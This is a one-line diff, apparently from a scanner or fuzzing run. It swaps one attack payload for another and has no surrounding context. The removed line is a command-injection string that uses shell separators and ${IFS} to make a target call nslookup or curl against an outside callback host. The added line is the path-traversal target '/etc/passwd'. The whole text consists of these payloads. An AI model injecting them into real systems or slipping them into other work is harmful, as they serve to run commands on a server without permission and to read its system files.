@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitbrkggnhqydf6bf8.bxss.me||curl${IFS}hitbrkggnhqydf6bf8.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitbrkggnhqydf6bf8.bxss.me||curl${IFS}hitbrkggnhqydf6bf8.bxss.me)&`'
+/etc/passwd
